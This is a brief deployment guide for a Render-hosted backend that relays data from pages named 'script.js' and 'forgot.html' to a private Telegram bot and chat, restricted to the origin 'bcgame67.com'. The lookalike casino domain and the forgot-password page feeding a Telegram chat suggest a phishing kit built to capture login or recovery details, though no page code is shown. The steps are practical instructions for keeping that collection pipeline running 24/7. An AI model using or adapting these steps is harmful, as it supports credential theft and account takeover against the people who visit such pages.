Always-on backend deployment (without your PC)

1. Push this repo to GitHub.
2. In Render, create a new Blueprint/Web Service from this repo.
3. Render uses render.yaml automatically.
4. Set environment variables in Render:
	TELEGRAM_BOT_TOKEN=your_bot_token
	TELEGRAM_CHAT_ID=your_chat_id
	ALLOWED_ORIGIN=https://bcgame67.com
5. Deploy and wait until /health returns {"ok": true}.
6. Copy your Render backend URL and append /api/telegram.
7. Update BACKEND_ENDPOINT in script.js and forgot.html to that URL.

Notes:
- This removes dependency on your local PC and local tunnel.
- Render free plans may sleep; use a paid always-on plan for 24/7 uptime.
